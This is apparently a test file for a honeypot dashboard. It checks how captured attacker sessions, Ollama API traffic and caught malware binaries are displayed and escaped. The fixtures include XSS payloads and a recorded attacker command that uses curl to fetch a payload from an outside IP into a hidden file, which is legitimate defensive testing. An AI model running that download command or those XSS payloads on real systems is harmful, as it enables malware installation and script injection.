import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';

const html = fs.readFileSync(new URL('../frontend-main/index.html', import.meta.url), 'utf8');
const script = html.match(/<script>([\s\S]*?)<\/script>/)[1];
// Compile the entire dashboard, then evaluate with a minimal DOM and no network.
new vm.Script(script);
const elements = new Map();
function element(id) {
    if (!elements.has(id)) elements.set(id, { value: id === 'ollamaStatus' ? 'all' : '', textContent: '', innerHTML: '', dataset: {}, addEventListener() {}, querySelectorAll: () => [] });
    return elements.get(id);
}
const context = vm.createContext({
    console, Intl, Date, Set, Map, URL, URLSearchParams,
    window: { addEventListener() {} },
    document: { getElementById: element, addEventListener() {}, querySelectorAll: () => [] },
    fetch: () => Promise.reject(new Error('Network disabled in test')),
    setTimeout() {}, setInterval() {},
});
// Suppress only the initial dashboard load; exercise the production tab functions.
vm.runInContext(script.replace(/\bloadDashboard\(\);/g, ''), context);
const connections = Array.from({ length: 30 }, (_, i) => ({
    Id: String(i), Timestamp: '2026-11-12T00:00:00Z', Peer: `203.0.113.1:${1000 + i}`,
    Method: 'POST', Path: '/api/chat', Status: i === 0 ? 429 : 200,
    Body: '<img src=x onerror=alert(1)>', Response: 'Hello!',
}));
context.fixture = { RetentionLimit: 1000, Connections: connections };
vm.runInContext('setupOllama(fixture)', context);
assert.match(element('ollamaCount').textContent, /30 matching.*1 \/ 2/);
assert.equal((element('ollamaConnections').innerHTML.match(/<article /g) || []).length, 25);
assert.ok(!element('ollamaConnections').innerHTML.includes('<img'));
assert.match(element('ollamaConnections').innerHTML, /&lt;img/);
assert.match(element('ollamaConnections').innerHTML, /ATTACKER INPUT/);
assert.match(element('ollamaConnections').innerHTML, /HONEYPOT RESPONSE/);
assert.match(element('ollamaOverviewStats').innerHTML, /API Connections/);
assert.match(element('ollamaOverviewStats').innerHTML, /Completion Replies/);
assert.match(element('ollamaOverviewStats').innerHTML, />30</);
assert.match(element('ollamaOverviewFreshness').textContent, /not lifetime totals/);
element('ollamaNext').onclick();
assert.match(element('ollamaCount').textContent, /2 \/ 2/);
element('ollamaStatus').value = 'throttled';
element('ollamaStatus').oninput();
assert.match(element('ollamaCount').textContent, /1 matching/);
element('ollamaQuery').value = 'not-present';
element('ollamaQuery').oninput();
assert.match(element('ollamaConnections').innerHTML, /No API connections match/);
vm.runInContext('setupOllama(null)', context);
assert.match(element('ollamaFreshness').textContent, /not been published/);
assert.match(element('ollamaOverviewStats').innerHTML, /—/);
assert.match(element('ollamaOverviewFreshness').textContent, /not been published/);
context.chat = {
    Id: 'chat', Timestamp: '2026-11-12T00:00:00Z', Peer: '203.0.113.2:4567',
    Method: 'POST', Path: '/api/chat', Status: 200, Response: 'Hello <script>alert(1)</script>',
    Body: JSON.stringify({ model: '<img src=x>', stream: true, messages: [
        { role: 'system', content: 'System instruction' },
        { role: 'user', content: [{ type: 'text', text: 'User question' }, { type: 'image_url', image_url: { url: 'https://example.invalid/tracking.png' } }] },
    ] }),
};
const chatHtml = vm.runInContext('renderOllamaExchange(chat)', context);
assert.match(chatHtml, /System instruction/);
assert.match(chatHtml, /User question/);
assert.match(chatHtml, /\[image_url\]/);
assert.ok(!chatHtml.includes('<script>'));
assert.ok(!chatHtml.includes('<img'));
assert.ok(!chatHtml.includes('src="https://example.invalid'));
assert.match(chatHtml, /&lt;script/);
assert.match(chatHtml, /Requested model/);
context.noBody = { Id: 'get', Method: 'GET', Path: '/api/tags', Status: 200 };
assert.match(vm.runInContext('renderOllamaExchange(noBody)', context), /No request body expected/);
context.noBody = { Id: 'limit', Status: 429 };
assert.match(vm.runInContext('renderOllamaExchange(noBody)', context), /throttled before/);
context.noBody = { Id: 'error', Method: 'POST', Status: 408, Error: 'timeout_or_shutdown' };
assert.match(vm.runInContext('renderOllamaExchange(noBody)', context), /connection failed or ended/);
context.truncated = { Id: 'partial', Method: 'POST', Path: '/api/chat', Status: 400, Body: '{"messages":[', BodyTruncated: true };
assert.match(vm.runInContext('renderOllamaExchange(truncated)', context), /truncated at 4,096/);
assert.match(vm.runInContext('renderOllamaExchange(truncated)', context), /raw request/);
context.usage = { TotalPromptTokens: 6088755, TotalCompletionTokens: 67215 };
vm.runInContext('renderPerformance(usage, {}, [], [])', context);
assert.equal(element('totalTokensUsed').textContent, '6,155,970');
assert.match(element('totalTokensBreakdown').textContent, /6,088,755 prompt \+ 67,215 completion/);
context.usage = {};
vm.runInContext('renderPerformance(usage, {}, [], [])', context);
assert.equal(element('totalTokensUsed').textContent, '—');
context.usage = { TotalPromptTokens: 0, TotalCompletionTokens: 0 };
vm.runInContext('renderPerformance(usage, {}, [], [])', context);
assert.equal(element('totalTokensUsed').textContent, '0');
context.usage = { TotalPromptTokens: -1, TotalCompletionTokens: 10 };
vm.runInContext('renderPerformance(usage, {}, [], [])', context);
assert.equal(element('totalTokensUsed').textContent, '—');
element('ollamaQuery').value = '';
element('ollamaStatus').value = 'all';
context.groupFixture = { RetentionLimit: 1000, Connections: [
    ...Array.from({ length: 60 }, (_, i) => ({ Id: `empty-${i}`, Timestamp: '2026-11-12T00:00:00Z',
        Peer: `203.0.113.3:${i + 1000}`, Method: 'GET', Path: '/api/tags', Status: 200,
        Body: i % 3 === 0 ? null : i % 3 === 1 ? '' : ' \n ' })),
    ...connections.slice(1).map(row => ({ ...row, Body: '{"prompt":"kept separate"}' })),
] };
vm.runInContext('setupOllama(groupFixture)', context);
assert.match(element('ollamaCount').textContent, /89 matching connections.*29 with bodies.*60 bodyless grouped.*1 \/ 2/);
assert.equal((element('ollamaConnections').innerHTML.match(/ollama-bodyless-group/g) || []).length, 1);
assert.equal((element('ollamaConnections').innerHTML.match(/<article /g) || []).length, 25);
assert.ok(!element('ollamaConnections').innerHTML.includes('API CONNECTION // empty-'));
assert.match(element('ollamaConnections').innerHTML, /60 bodyless connections/);
assert.match(element('ollamaOverviewStats').innerHTML, />89</);
element('ollamaQuery').value = '/api/tags';
element('ollamaQuery').oninput();
assert.match(element('ollamaCount').textContent, /60 matching connections.*0 with bodies.*60 bodyless grouped/);
assert.equal((element('ollamaConnections').innerHTML.match(/<article /g) || []).length, 0);
assert.ok(!element('ollamaConnections').innerHTML.includes('No API connections match'));
context.groupFixture.Connections = [{ Id: 'hostile', Method: 'GET', Path: '<img src=x>', Status: 429, Body: null }];
element('ollamaQuery').value = '';
vm.runInContext('setupOllama(groupFixture)', context);
assert.ok(!element('ollamaConnections').innerHTML.includes('<img'));
assert.match(element('ollamaConnections').innerHTML, /&lt;img/);
element('ollamaStatus').value = 'success';
element('ollamaStatus').oninput();
assert.match(element('ollamaConnections').innerHTML, /No API connections match/);

// Attacker Exchange: caught binaries rendering, session ID/binary search, and 0-command binary sessions.
const binarySession = {
    SessionId: '035e6d1ae3bb40ff',
    StartedAt: '2026-11-25T01:07:37Z',
    EndedAt: '2026-11-25T01:08:43Z',
    DurationSeconds: 65.6,
    RemoteEndpoint: '77.239.124.73:10746',
    RemoteIp: '77.239.124.73',
    Username: 'hafih',
    ClientVersion: 'SSH-2.0-Go',
    Commands: [{
        Sequence: 32,
        ExchangeId: '035e6d1ae3bb40ff:000008',
        MessageNumber: 8,
        Command: 'curl -sSL http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor',
        Timestamp: '2026-11-25T01:08:04Z',
        HasResponse: true,
        Response: '',
        ResponseSource: 'cache',
    }],
    Timeline: [{
        Timestamp: '2026-11-25T01:08:04Z',
        Event: 'payload_capture',
        Sequence: 35,
        ExchangeId: '035e6d1ae3bb40ff:000008',
        Data: {
            RemoteEndpoint: '77.239.124.73:10746',
            Url: 'http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG',
            Status: 'captured',
            BytesCaptured: 37797676,
            Sha256: 'd199756613123b438d94f56f99de082a829c6b93cb78a15bcf1a97630a7a1e24',
            Path: '/var/log/funnypot/uploads/035e6d1a/20261125010809_CZRmrtxnrNONBXhwfFeqjNfBrliNaShG.quarantine',
            Analysis: {
                FileFormat: 'ELF 64-bit LSB',
                Architecture: 'x86-64',
                Endianness: 'LSB',
                BinaryType: 'executable',
                Summary: 'ELF 64-bit LSB | x86-64 | executable | entropy 8.00 | indicators: packer:UPX',
                MimeType: 'application/x-executable',
                Entropy: 8,
                IsExecutable: true,
                IsLikelyPackedOrEncrypted: true,
                SuspiciousIndicators: ['packer:UPX'],
                NotableStrings: ['jzUPX!', '<img src=x onerror=alert(1)>'],
            },
        },
    }],
};
const uploadOnlySession = {
    SessionId: 'e2a7bfc1df3e43c4',
    RemoteEndpoint: '77.239.124.63:36270',
    RemoteIp: '77.239.124.63',
    Username: 'john',
    Commands: [],
    Timeline: [{
        Timestamp: '2026-11-19T13:27:22Z',
        Event: 'payload_capture',
        Data: {
            RemoteEndpoint: '77.239.124.63:36270',
            Url: 'http://103.160.59.94:28816/only_binary.elf',
            Status: 'captured',
            BytesCaptured: 5242880,
            Sha256: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            Path: '/var/log/funnypot/uploads/e2a7bfc1/only_binary.elf.quarantine',
            Analysis: { FileFormat: 'ELF 64-bit LSB', Architecture: 'x86-64', BinaryType: 'executable', Entropy: 7.9, IsExecutable: true, IsLikelyPackedOrEncrypted: true },
        },
    }],
};
context.exchangeSessionsFixture = [binarySession, uploadOnlySession];
context.exchangeBinariesFixture = [{
    CapturedAtUtc: '2026-11-25T01:08:09Z',
    SessionId: '035e6d1ae3bb40ff',
    ExchangeId: '035e6d1ae3bb40ff:000008',
    Source: 'url_payload',
    Status: 'captured',
    RemoteEndpoint: '77.239.124.73:10746',
    Username: 'hafih',
    OriginalFilename: 'CZRmrtxnrNONBXhwfFeqjNfBrliNaShG',
    StoredFilePath: '/var/log/funnypot/uploads/035e6d1a/20261125010809_CZRmrtxnrNONBXhwfFeqjNfBrliNaShG.quarantine',
    CapturedBytes: 37797676,
    Sha256: 'd199756613123b438d94f56f99de082a829c6b93cb78a15bcf1a97630a7a1e24',
    Analysis: binarySession.Timeline[0].Data.Analysis,
}];
vm.runInContext(`
    window.cachedBinaries = exchangeBinariesFixture;
    renderDashboard({ TotalSessions: 2, TotalCommands: 1 }, { TotalEvents: 2, EventCounts: {} }, [], {}, exchangeSessionsFixture);
    setupBinaries(exchangeBinariesFixture, sessionModels);
`, context);
const exchangeHtml = element('latestExchanges').innerHTML;
assert.match(exchangeHtml, /Caught Binary Artifact/);
assert.match(exchangeHtml, /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG/);
assert.match(exchangeHtml, /d199756613123b438d94f56f99de082a829c6b93cb78a15bcf1a97630a7a1e24/);
assert.match(exchangeHtml, /packer:UPX/);
assert.match(exchangeHtml, /CAUGHT BINARY ARTIFACT/);
assert.ok(!exchangeHtml.includes('<img src=x'));
assert.match(exchangeHtml, /&lt;img src=x/);
assert.equal(vm.runInContext(`exchangeFilters.query = '035e6d1ae3bb'; filteredExchangeSessions(sessionModels).length`, context), 1);
assert.equal(vm.runInContext(`exchangeFilters.query = 'd19975661312'; filteredExchangeSessions(sessionModels).length`, context), 1);
assert.equal(vm.runInContext(`exchangeFilters.query = 'e2a7bfc1df3e'; filteredExchangeSessions(sessionModels).length`, context), 1);
vm.runInContext(`exchangeFilters.query = 'e2a7bfc1df3e'; selectedExchangeSessionId = null; renderLatestExchanges(sessionModels);`, context);
assert.match(element('latestExchanges').innerHTML, /only_binary\.elf/);
assert.match(element('latestExchanges').innerHTML, /No shell command transcript recorded/);

// Per-tab clean URL routing (GitHub Pages direct path & 404.html redirect handoff).
const fourOhFourHtml = fs.readFileSync(new URL('../frontend-main/404.html', import.meta.url), 'utf8');
assert.match(fourOhFourHtml, /funnypot:redirectPath/);
assert.match(fourOhFourHtml, /attackerexchange/);
assert.match(fourOhFourHtml, /attackmindmap/);
assert.equal(vm.runInContext(`resolveTabFromRoute('AttackerExchange')`, context), 'exchange');
assert.equal(vm.runInContext(`resolveTabFromRoute('CaughtBinaries')`, context), 'binaries');
assert.equal(vm.runInContext(`resolveTabFromRoute('AttackMindMap')`, context), 'mindmap');
assert.equal(vm.runInContext(`resolveTabFromRoute('Ollama')`, context), 'ollama');
assert.deepEqual(
    { ...vm.runInContext(`resolveInitialRoute({ pathname: '/FunnyPot.ai/AttackerExchange', search: '', hash: '' }, null)`, context) },
    { tab: 'exchange', basePath: '/FunnyPot.ai/', fromRedirect: false, hasExplicitRoute: true }
);
assert.deepEqual(
    { ...vm.runInContext(`resolveInitialRoute({ pathname: '/FunnyPot.ai/', search: '', hash: '' }, '/FunnyPot.ai/AttackMindMap')`, context) },
    { tab: 'mindmap', basePath: '/FunnyPot.ai/', fromRedirect: true, hasExplicitRoute: true }
);
assert.equal(vm.runInContext(`tabUrl('exchange', '/FunnyPot.ai/')`, context), '/FunnyPot.ai/AttackerExchange');
assert.equal(vm.runInContext(`tabUrl('mindmap', '/FunnyPot.ai/')`, context), '/FunnyPot.ai/AttackMindMap');
assert.match(html, /href="AttackerExchange"/);
assert.match(html, /href="AttackMindMap"/);

// Attack Mind Map (Pilot): tree rendering, clickable artefact explanations, folding, and escaping.
vm.runInContext(`
    exchangeFilters.query = '';
    mindmapQuery = '';
    mindmapFilter = 'rich';
    mindmapSessionId = null;
    mindmapSelectedNodeId = null;
    mindmapFoldedNodes = new Set();
    setupMindMap(sessionModels);
`, context);
const mmCanvasInitial = element('mindmapCanvas').innerHTML;
assert.match(mmCanvasInitial, /hafih@77\.239\.124\.73/);
assert.match(mmCanvasInitial, /Origin &amp; Access/);
assert.match(mmCanvasInitial, /Command Kill-Chain/);
assert.match(mmCanvasInitial, /Caught Binaries &amp; Malware/);
assert.match(mmCanvasInitial, /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG/);
assert.match(mmCanvasInitial, /data-mm-fold="branch-binaries"/);

// Clicking an artefact updates the plain-English explainer and safely escapes HTML.
vm.runInContext(`selectMindMapNode('bin-0-entropy')`, context);
assert.match(element('mindmapInspector').innerHTML, /Packing &amp; Entropy/);
assert.match(element('mindmapInspector').innerHTML, /Shannon entropy of 8\.00/);
assert.match(element('mindmapInspector').innerHTML, /packer:UPX/);
vm.runInContext(`selectMindMapNode('bin-0-strings')`, context);
assert.ok(!element('mindmapInspector').innerHTML.includes('<img src=x'));
assert.match(element('mindmapInspector').innerHTML, /&lt;img src=x/);
vm.runInContext(`selectMindMapNode('origin-client')`, context);
assert.match(element('mindmapInspector').innerHTML, /Go standard crypto\/ssh client/);

// Folding a branch hides its children and shows collapsed descendant count; unfolding restores them.
vm.runInContext(`toggleMindMapFold('branch-binaries')`, context);
const mmCanvasFolded = element('mindmapCanvas').innerHTML;
assert.ok(!mmCanvasFolded.includes('data-mm-select="bin-0-entropy"'));
assert.match(mmCanvasFolded, /data-mm-fold="branch-binaries" aria-expanded="false"[^>]*>\+ /);
vm.runInContext(`toggleMindMapFold('branch-binaries')`, context);
assert.match(element('mindmapCanvas').innerHTML, /data-mm-select="bin-0-entropy"/);

console.log('Frontend: all Ollama, Attacker Exchange caught-binary, per-tab clean URL routing, and Attack Mind Map pilot checks passed.');
